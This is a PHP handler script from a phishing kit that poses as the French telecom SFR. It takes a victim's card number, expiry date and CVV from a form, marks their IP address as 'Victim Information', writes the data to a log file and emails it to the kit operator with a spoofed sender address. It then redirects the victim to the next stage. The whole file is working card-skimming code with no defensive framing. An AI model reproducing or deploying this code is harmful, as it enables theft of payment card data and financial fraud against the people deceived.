<?php
$pg=$_REQUEST['page'];
error_reporting(0);
include ('bots.php');
include ('bot.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");
include 'rm.php';
$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . "";
$to = $Your_Email;$from = "impots@online.de";$headers = "From:" . $from;$subj = "OK SFR : $ip";
if(!isset($_REQUEST['tel']) || $_REQUEST['tel']=='' ){
	die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");
}
if(!isset($_REQUEST['field']) || $_REQUEST['field']=='' ){
	die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");
}

$cccnum = $_REQUEST['tel'];
$exm = $_REQUEST['expirydatefield-month'];
$exy = $_REQUEST['expirydatefield-year'];
$cccv = $_REQUEST['field'];
$bin4 = substr($cccnum , 12 , 16);
$bin = substr($cccnum , 0 , 6);

if(strlen($cccnum) < 15)
{
    die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");

}else{

	if(strlen($cccv) < 3){
		die("<script type='text/javascript'>top.location ='index.php?$rand_tarikh';</script>");
	  
	}else{
		
        $data = "
+ --------- $subj ---------+
+ -------------------------------------------------------------+
+ SFR OK
| CARTA NUMERO : $cccnum
| EXPIRE MM : $exm
| EXPIRE YY : $exy
| CV2 : $cccv
+ -------------------------------------------------------------+
  BIN : $bin
+ -------------------------------------------------------------+
+ Victim Information
 $VictimInfo
+ -------------------------------------------------------------+
";
if($Save_Log==0) { $file = fopen("../../nd7/Full.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); }
die("<script type='text/javascript'>top.location = './load/index.php?page=$bin4';</script>");

	}

}

?>